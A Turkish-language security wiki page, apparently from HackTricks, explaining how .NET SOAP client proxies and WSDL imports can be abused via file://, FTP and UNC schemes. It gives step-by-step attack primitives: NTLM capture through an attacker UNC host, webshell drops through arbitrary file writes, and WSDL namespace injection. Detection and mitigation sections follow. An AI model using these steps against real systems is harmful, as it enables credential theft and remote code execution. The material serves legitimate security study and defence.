# .NET SOAP/WSDL Client Proxy İstismarı

{{#include ../../banners/hacktricks-training.md}}

## TL;DR

- `SoapHttpClientProtocol`, `DiscoveryClientProtocol` ve benzerleri `HttpWebClientProtocol`'den miras alır; `GetWebRequest()` `WebRequest.Create()` tarafından üretilen şemadan bağımsız `WebRequest` örneğini döndürür ve `HttpWebRequest`'i zorlamaz.
- Bir saldırgan proxy `Url` üzerinde kontrol sahibi olursa, framework sessizce `FileWebRequest`, `FtpWebRequest` veya UNC/SMB handler'larını devreye sokar; böylece "HTTP" proxy'leri NTLM leak gadget'larına veya rastgele dosya yazıcılarına dönüşür.
- `ServiceDescriptionImporter` ile saldırgan kontrollü WSDL içe aktaran herhangi bir özellik hatayı daha da kötüleştirir: WSDL üretilen proxy constructor'ını, SOAP metodlarını, kompleks tipleri ve namespace'leri kontrol eder; Barracuda Service Center RMM, Ivanti EPM, Umbraco 8, PowerShell ve SSIS gibi ürünlerde pre-auth RCE (webshell, script drop) mümkün hale gelir.

## Root cause: HttpWebClientProtocol is scheme-agnostic

`WebClientProtocol.GetWebRequest()` `var req = WebRequest.Create(uri)` yapar ve onu değiştirmeden döndürür. `HttpWebClientProtocol.GetWebRequest()` HTTP'ye özgü alanları ayarlamak için `req as HttpWebRequest` denemesi yapar, ancak cast başarısız olsa bile **orijinal `req`'yi döndürür**. Bu nedenle runtime `Url` içinde bulunan şemaya uyar:

- `http(s)://` → `HttpWebRequest`
- `file:///` veya `\\host\share\` → `FileWebRequest`
- `ftp://` → `FtpWebRequest`

`SoapHttpClientProtocol.Invoke()` sonra SOAP POST gövdesini seçilen hangi transport handler ise onun üzerinden stream eder; bu bazen diske yazmak veya SMB üzerinden iletmek anlamına gelir.

## Primitive 1 – NTLM capture / relay via UNC targets

1. `SoapHttpClientProtocol.Url` üzerinde kontrol elde edin (doğrudan setter, config değeri, veritabanı satırı vb.).
2. Bunu `file://attacker.local/sink/payload` gibi bir UNC yoluna işaret edin.
3. CLR yolu SMB üzerinden açar ve integrated authentication gerçekleştirir, bu da NTLM challenge/response bilgisini saldırgana leaking eder.
4. Yakalanan hash'leri offline kırma veya signing/EPA yoksa NTLM relay (SMB/HTTP) için kullanın.

Bu, kullanıcı girdisi kabul eden herhangi bir .NET SOAP/HTTP proxy yolu için geçerlidir; daha fazla istismar mümkün olmasa bile.

## Primitive 2 – Arbitrary file writes via `file://`

1. Proxy çağrısından önce `Url = "file:///inetpub/wwwroot/poc.aspx"` (veya herhangi bir yazılabilir yol) olarak ayarlayın.
2. Herhangi bir SOAP metodunu çağırın; framework tüm SOAP envelope'unu seçilen yola yazar ve mevcut dosyaların üzerine yazar.
3. Kullanıcı kontrollü argümanlar XML elemanları içinde görünür, bu da saldırganların CSHTML/ASPX payload'ları bırakmasına veya config dosyalarını zehirlemesine izin verir.

Sınırlamalar:

- İçerik her zaman XML'dir; skaler alanlar entity-encoded olur, bu yüzden düz string ile `<script>` enjekte etmek ek numaralar gerektirir.
- Anlamlı payload'lar en az bir saldırgan etkili argüman veya method imzasını değiştirme yeteneği gerektirir (WSDL istismarı bölümüne bakın).

Runtime çoğunlukla yazma işleminden sonra `Client found response content type of 'application/octet-stream', but expected 'text/xml'` hatası fırlatır — bu hatayı bir IOC olarak değerlendirin.

## Weaponizing WSDL imports

### Auto-generated proxies via `ServiceDescriptionImporter`

Birçok ürün "custom web service" özellikleri sunar ve bir WSDL URL'si kabul eder, ardından:

1. Saldırgan kontrollü WSDL'i `ServiceDescription.Read()` ile okur.
2. `ServiceDescriptionImporter` `SoapHttpClientProtocol`'ü genişleten C# proxy sınıfları üretir.
3. CodeDOM proxy'yi derler ve reflection istenen metodu çağırır.

Saldırgan tam kontrol sahibidir:

- `soap:address` / `soap12:address` `location` → `base.Url` olur (bunu `file://` veya UNC yolları olarak ayarlamak mümkün).
- Metod isimleri, parametre listeleri, kompleks tipler ve serializer'lar.
- Her SOAP mesajında `xmlns:*` attribute'ları olarak çıkan Namespace URI'leri.

Herhangi bir şema doğrulaması yapılmaz, bu yüzden üretilen her proxy orijinal tasarım hatasını taşır.

### Shaping the SOAP envelope for RCE

- Complex type serialization: WSDL'de özel struct'lar tanımlayın; `XmlSerializer` bunları yeniden serileştirdiğinde saldırganın seçtiği element adlarını/attribute'larını üretir. ASPX webshell bırakmaları için, şu şekilde serileşen tipler oluşturun:
```xml
<script runat="server">
// payload pulling `Request.QueryString["cmd"]`
</script>
```
ve RCE elde etmek için `Url`'u `file:///.../webroot/shell.aspx` olarak işaret edin.
- Namespace injection: Argümanlar sabit olsa bile (ör. Umbraco Forms), WSDL'de bildirilen namespace'ler (ör. `xmlns:tns="http://host/service?x=@{...}"`) SOAP envelope'una olduğu gibi kopyalanır. Namespace query string'i içine gömülü payload'lar CSHTML Razor veya PowerShell script drop'larına parametre kontrolü olmadan izin verir.

Bu teknikler Barracuda Service Center RMM (CVE-2025-34392) istismarını mümkün kıldı: doğrulanmamış bir SOAP çağrısı kötü niyetli bir WSDL sağladı, `soap12:address`'i `file:///Program Files/.../SCMessaging/poc.aspx` olarak ayarladı, kompleks parametreler yoluyla `<script runat="server">` enjekte etti ve rastgele `cmd.exe` komutları çalıştıran bir webshell yükledi.

## Typical attack workflow

1. WSDL URL'si kabul eden veya kullanıcıların SOAP endpoint'lerini yapılandırmasına izin veren işlevselliği tespit edin (ör. Barracuda `InvokeRemoteMethod`, Ivanti EPM connector'ları, Umbraco 8 Forms datasources, PowerShell `New-WebServiceProxy`).
2. `soap:address`'i yazılabilir bir yol veya UNC share'e işaret eden ve şema tanımları payload-uyumlu method/typeları sağlayan kötü niyetli bir WSDL barındırın.
3. İçe aktarma/derlemeyi tetikleyin. Hedef, saldırgan kontrollü constructor ve method'lara sahip bir proxy DLL yayımlar.
4. Uygulama üretilen metodu çağırdığında, SOAP isteği serileştirilir ve saldırgan tarafından belirlenen yola yazılır; payload gömülür.
5. Bırakılan dosyayı çalıştırın (örn. `poc.aspx?cmd=whoami`'yi tarayıcıda açın), CSHTML'i yükleyin veya yakalanan NTLM materyalini replay edin.

## Detection & hunting

- Static analysis: `ServiceDescriptionImporter`, `SoapHttpClientProtocol`, `HttpWebClientProtocol` veya `New-WebServiceProxy` için grep yapın. `Url` veya WSDL girdilerinin kaynağını izleyin—kullanıcı kontrollü olan her şey kırmızı bayraktır.
- Runtime telemetry:
- Proxy oluşturmayı şemeleri loglayacak şekilde enstrümente edin; `file`, `ftp` veya UNC değerleri için alarm kurun.
- SOAP çağrılarından sonra tipik "Client found response content type of 'application/octet-stream'" hatalarını izleyin.
- Web servis kimliğinin uygulama dizinleri altında beklenmeyen `.aspx/.cshtml/.ps1` yazımlarını izleyin.
- Network/dosya sinyalleri: Web sunucularının saldırgan altyapısına başlattığı SMB bağlantıları veya geçici proxy DLL'lerinin ani derlenmesi genellikle istismardan önce gelir.

## Mitigations

- `HttpWebClientProtocol` türetilmiş herhangi bir proxy'yi çağırmadan önce transport doğrulaması uygulayın:
```csharp
var uri = new Uri(proxy.Url);
if (uri.Scheme != Uri.UriSchemeHttp && uri.Scheme != Uri.UriSchemeHttps)
throw new InvalidOperationException("SOAP clients must stay on HTTP/S");
```
- İçe aktarılan WSDL'i sanitize edin: Proxy indirmelerini `soap:address` girişlerini HTTP/S olmayanlar için yeniden yazan veya reddeden, bilinmeyen binding'leri düşüren ve namespace payload numaralarını yasaklayan bir broker üzerinden yönlendirin.
- Güvenilmeyen WSDL özelliklerini devre dışı bırakın: "upload a WSDL" kolaylıklarını doğrulanmış, server-side template'lerle veya allowlist'lerle değiştirin.
- Yazma konumlarını ayrıştırın: App pool'ların executable dizinlere yazamamasını sağlayın; veri ile kod için ayrı volumelar kullanın ki dosya-yazma primitifleri RCE'ye dönüşmesin.
- NTLM maruziyetini sertleştirin: Mümkünse outbound SMB'yi devre dışı bırakın; aksi halde SMB signing, EPA ve diğer relay mitigasyonlarını zorunlu kılın.

## References

- [watchTowr Labs – SOAPwn: Pwning .NET Framework Applications Through HTTP Client Proxies and WSDL](https://labs.watchtowr.com/soapwn-pwning-net-framework-applications-through-http-client-proxies-and-wsdl/)

{{#include ../../banners/hacktricks-training.md}}
